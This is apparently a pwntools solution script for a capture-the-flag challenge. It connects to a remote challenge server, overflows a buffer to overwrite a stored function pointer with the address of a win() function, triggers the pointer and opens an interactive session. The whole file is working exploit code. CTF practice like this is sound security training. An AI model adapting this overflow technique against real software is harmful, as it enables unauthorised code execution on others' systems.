from pwn import *
import time

p = process('./dist/users')
e = p.elf
p = remote("cbactf.com", 5004)

# overwrite the meme() pointer with win due to the buffer overflow
p.sendlineafter(b'$ ', b'S')
p.sendlineafter(b'$ ', b'0')
p.sendlineafter(b'$ ', b'A' * 0x14 + p32(e.symbols['win']))

# call the meme pointer (which now points to win())
p.sendlineafter(b'$ ', b'M')
p.sendlineafter(b'$ ', b'0')

p.interactive()
p.close()
